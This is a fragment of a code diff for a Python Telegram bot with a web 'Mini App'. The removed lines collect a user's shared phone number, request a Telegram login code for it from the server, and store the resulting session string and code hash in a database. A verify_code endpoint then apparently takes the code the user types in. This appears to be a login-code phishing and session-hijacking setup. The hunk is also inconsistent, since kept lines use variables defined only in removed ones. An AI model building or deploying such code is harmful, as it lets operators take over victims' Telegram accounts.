@@ -212,30 +212,6 @@ def verify_code():
     else:
         return jsonify({"success": False, "error": error})
 
-    print("Starting bot listener...")
-    await bot_client.start(bot_token=BOT_TOKEN)
-    print("Bot is online. Waiting for contacts...")
-
-        if event.message.media and hasattr(event.message.media, "phone_number"):
-            phone = event.message.media.phone_number
-            user_id = str(event.message.sender_id)
-            
-            print(f"\n[CONTACT] {user_id}: {phone}")
-            
-            client = TelegramClient(StringSession(), API_ID, API_HASH)
-            try:
-                await client.connect()
-                result = await client.send_code_request(phone)
-                phone_code_hash = result.phone_code_hash
-                session_string = client.session.save()
-                
-                conn = get_db()
-                cur = conn.cursor()
-                cur.execute("INSERT INTO sessions (user_id, phone, phone_code_hash, session_string) VALUES (%s, %s, %s, %s) ON CONFLICT (user_id) DO UPDATE SET phone=%s, phone_code_hash=%s, session_string=%s", (user_id, phone, phone_code_hash, session_string, phone, phone_code_hash, session_string))
-                conn.commit()
-                cur.close()
-                conn.close()
-                
                 print(f"[CODE SENT] to {phone}")
                 await bot_client.send_message(user_id, "✅ Code sent! Check your Telegram and enter it in the Mini App.")
                 await client.disconnect()
